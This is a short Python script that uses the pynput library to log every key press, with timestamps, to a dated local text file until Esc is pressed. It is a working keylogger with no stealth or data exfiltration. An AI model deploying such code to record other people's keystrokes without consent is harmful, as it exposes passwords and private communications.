from pynput.keyboard import Key, Listener
import logging
from datetime import datetime


current_date = datetime.now().strftime('%Y-%m-%d') 
file_name = current_date + '_logs.txt' #the file name for the .txt
format = '%(asctime)s: %(message)s' # format of the log
 
logging.basicConfig(filename=file_name ,level=logging.DEBUG, format= format)

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False
    
# Collect events until on_press returns false 
with Listener(on_press=on_press) as Listener:
    Listener.join()